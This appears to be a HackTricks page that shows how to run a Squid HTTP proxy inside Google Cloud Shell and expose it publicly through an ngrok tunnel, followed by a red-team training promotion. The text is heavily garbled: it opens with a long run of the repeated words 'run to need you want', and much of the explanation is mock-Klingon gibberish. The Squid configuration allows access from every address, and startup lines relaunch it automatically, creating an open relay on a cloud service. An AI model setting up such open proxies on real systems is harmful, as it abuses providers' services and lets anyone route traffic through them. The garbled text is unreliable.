**run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **
```bash
sudo apt install -y squid
```
**Qapla'!** Squid vIqro' Http proxy server. **squid.conf** file yIlo'lu' 'ej **ghItlh** settings vItlhutlh:
```bash
http_port 3128
cache_dir /var/cache/squid 100 16 256
acl all src 0.0.0.0/0
http_access allow all
```
**squid.conf** file ni **/etc/squid** ga nusqa qiling.
```bash
sudo cp squid.conf /etc/squid
```
Finally run the squid service:

**Klingon Translation:**

**Qapla'!** squid Daq 'oH.
```bash
sudo service squid start
```
Use ngrok to let the proxy be available from outside:

`ngrok` is a tool that allows you to expose a local server to the internet by creating a secure tunnel. This can be useful when you want to access your proxy from outside the network.

To use `ngrok` with your proxy, follow these steps:

1. Download and install `ngrok` from the official website.
2. Open a terminal and navigate to the directory where `ngrok` is installed.
3. Start `ngrok` by running the following command:

```
ngrok http <port>
```

Replace `<port>` with the port number on which your proxy is running.

4. `ngrok` will generate a unique URL that you can use to access your proxy from outside. Look for the line that starts with `Forwarding` in the `ngrok` terminal output. It will look something like this:

```
Forwarding                    http://<random-string>.ngrok.io -> http://localhost:<port>
```

5. Copy the `http://<random-string>.ngrok.io` URL and share it with anyone who needs to access your proxy.

Now, anyone who visits the `http://<random-string>.ngrok.io` URL will be able to access your proxy. Keep in mind that the `ngrok` tunnel is temporary and will close when you stop `ngrok` or restart your computer.
```bash
./ngrok tcp 3128
```
DaH jImej copy qar'a'. vaj browser proxy settings (squid http proxy server) port field vItlhutlh browser proxy vItlhutlh port 'ej port 'ej tcp:// qar'a' part jImej.

startup vaj .bashrc file vItlhutlh vItlhutlh lines:
```bash
sudo apt install -y squid
sudo cp squid.conf /etc/squid/
sudo service squid start
cd ngrok;./ngrok tcp 3128
```
The instructions were copied from [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key). Check that page for other crazy ideas to run any kind of software (databases and even windows) in Cloud Shell.

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
